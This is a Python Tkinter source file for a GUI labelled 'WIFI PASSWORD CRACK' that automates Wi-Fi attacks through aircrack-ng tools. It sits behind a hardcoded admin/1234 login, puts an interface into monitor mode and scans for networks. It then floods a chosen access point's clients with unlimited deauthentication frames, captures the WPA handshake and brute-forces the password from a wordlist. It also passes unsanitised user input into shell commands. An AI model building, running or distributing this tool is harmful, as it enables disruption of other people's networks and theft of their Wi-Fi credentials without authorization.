import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import subprocess
import os

def login():
    if username_entry.get() == "admin" and password_entry.get() == "1234":
        login_window.destroy()
        main_window()
    else:
        messagebox.showerror("Error", "Wrong username or password")

def enable_monitor():
    iface = interface_var.get()
    if iface:
        try:
            subprocess.call(f"xterm -e 'sudo airmon-ng start {iface}'", shell=True)
        except:
            messagebox.showerror("Error", "Failed to enable Monitor Mode")
    else:
        messagebox.showwarning("Warning", "Select an interface first")

def scan_networks():
    iface = interface_var.get()
    if iface:
        try:
            for file in ["scan.csv", "scan-01.csv"]:
                if os.path.exists(file):
                    os.remove(file)
            global scan_process
            scan_process = subprocess.Popen(
                ["sudo", "airodump-ng", "--write", "scan", "--output-format", "csv", iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            main.after(15000, stop_scan)
        except:
            messagebox.showerror("Error", "Failed to scan networks")
    else:
        messagebox.showwarning("Warning", "Select an interface first")

def stop_scan():
    scan_process.terminate()
    if os.path.exists("scan-01.csv"):
        with open("scan-01.csv", "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        for item in tree.get_children():
            tree.delete(item)
        networks = False
        for line in lines:
            if "Station MAC" in line:
                break
            if networks and line.strip():
                parts = line.split(",")
                if len(parts) > 13:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip()
                    tree.insert("", "end", values=(bssid, channel, essid))
            if "BSSID" in line and "ESSID" in line:
                networks = True

def select_handshake_folder():
    path = filedialog.askdirectory(title="Select folder to save captured Handshake")
    handshake_folder_var.set(path)

def select_existing_handshake():
    file = filedialog.askopenfilename(title="Select existing Handshake file", filetypes=[("CAP Files","*.cap")])
    existing_handshake_var.set(file)

def select_wordlist():
    file = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    wordlist_var.set(file)

def start_bruteforce():
    handshake_file = existing_handshake_var.get()
    wordlist = wordlist_var.get()
    target_mac_val = target_mac.get()
    if handshake_file and wordlist and target_mac_val:
        try:
            cmd = f"xterm -hold -e 'aircrack-ng -w \"{wordlist}\" -b {target_mac_val} \"{handshake_file}\"'"
            subprocess.Popen(cmd, shell=True)
        except:
            messagebox.showerror("Error", "Brute-force failed")
    else:
        messagebox.showwarning("Warning", "Select handshake file, wordlist and enter target MAC")

def grab_handshake():
    iface = interface_var.get()
    target_mac_val = target_mac.get()
    channel_val = channel_var.get()
    folder = handshake_folder_var.get()

    if not iface or not target_mac_val or not channel_val or not folder:
        messagebox.showwarning("Warning", "Select interface, MAC, channel and handshake folder first")
        return

    try:
        # Deauth continuously
        deauth_cmd = f"xterm -hold -e 'sudo aireplay-ng --deauth 0 -a {target_mac_val} {iface}'"
        subprocess.Popen(deauth_cmd, shell=True)
        # Capture Handshake
        handshake_cmd = f"xterm -hold -e 'sudo airodump-ng -c {channel_val} --bssid {target_mac_val} -w \"{folder}\" {iface}'"
        subprocess.Popen(handshake_cmd, shell=True)
        messagebox.showinfo("Info", "Deauth sent to all clients. Handshake capturing started!\nHandshake will be saved in selected folder.")
    except:
        messagebox.showerror("Error", "Failed to start Deauth + Handshake capture")

def on_network_select(event):
    selected = tree.focus()
    if selected:
        values = tree.item(selected, "values")
        target_mac.delete(0, tk.END)
        target_mac.insert(0, values[0])
        channel_var.set(values[1])

def main_window():
    global interface_var, handshake_folder_var, existing_handshake_var, wordlist_var, target_mac, channel_var, tree, main
    main = tk.Tk()
    main.title("LOSTIN TOOL - WIFI PASSWORD CRACK @ly5i")
    main.geometry("900x750")
    main.configure(bg="black")
    
    tk.Label(main, text="LOSTIN TOOL - WIFI PASSWORD CRACK @ly5i", bg="black", fg="white", font=("Arial",16,"bold")).pack(pady=10)
    
    frame = tk.Frame(main, bg="black")
    frame.pack(pady=10)

    tk.Label(frame, text="Network Interface:", bg="black", fg="white").grid(row=0, column=0, padx=5, pady=5)
    interface_var = tk.StringVar()
    tk.Entry(frame, textvariable=interface_var, width=20).grid(row=0, column=1, pady=5)
    tk.Button(frame, text="Enable Monitor Mode", command=enable_monitor, bg="white", fg="black").grid(row=0, column=2, padx=5)
    
    tk.Button(frame, text="Scan Networks", command=scan_networks, bg="white", fg="black").grid(row=1, column=0, columnspan=3, pady=10)

    columns = ("BSSID", "Channel", "ESSID")
    tree = ttk.Treeview(main, columns=columns, show="headings", height=10)
    for col in columns:
        tree.heading(col, text=col)
    tree.pack(pady=10)
    tree.bind("<<TreeviewSelect>>", on_network_select)

    handshake_folder_var = tk.StringVar()
    tk.Button(frame, text="Select Folder to Save Handshake", command=select_handshake_folder, bg="white", fg="black").grid(row=2, column=0, columnspan=3, pady=5)

    existing_handshake_var = tk.StringVar()
    tk.Button(frame, text="Select Existing Handshake File", command=select_existing_handshake, bg="white", fg="black").grid(row=3, column=0, columnspan=3, pady=5)

    tk.Label(frame, text="Target MAC Address:", bg="black", fg="white").grid(row=4, column=0, padx=5, pady=5)
    target_mac = tk.Entry(frame, width=25)
    target_mac.grid(row=4, column=1, pady=5)

    tk.Label(frame, text="Channel:", bg="black", fg="white").grid(row=5, column=0, padx=5, pady=5)
    channel_var = tk.StringVar()
    tk.Entry(frame, textvariable=channel_var, width=10).grid(row=5, column=1, sticky="w", pady=5)

    wordlist_var = tk.StringVar()
    tk.Button(frame, text="Select Wordlist", command=select_wordlist, bg="white", fg="black").grid(row=6, column=0, columnspan=3, pady=10)
    
    tk.Button(frame, text="Start Brute-force", command=start_bruteforce, bg="white", fg="black").grid(row=7, column=0, columnspan=3, pady=10)
    tk.Button(frame, text="Grab Handshake (Deauth All Clients)", command=grab_handshake, bg="red", fg="white").grid(row=8, column=0, columnspan=3, pady=10)

    main.mainloop()

login_window = tk.Tk()
login_window.title("Login")
login_window.geometry("300x150")
login_window.configure(bg="black")

tk.Label(login_window, text="Username:", bg="black", fg="white").pack(pady=2)
username_entry = tk.Entry(login_window)
username_entry.pack()

tk.Label(login_window, text="Password:", bg="black", fg="white").pack(pady=2)
password_entry = tk.Entry(login_window, show="*")
password_entry.pack()

tk.Button(login_window, text="Login", command=login, bg="white", fg="black").pack(pady=5)

login_window.mainloop()
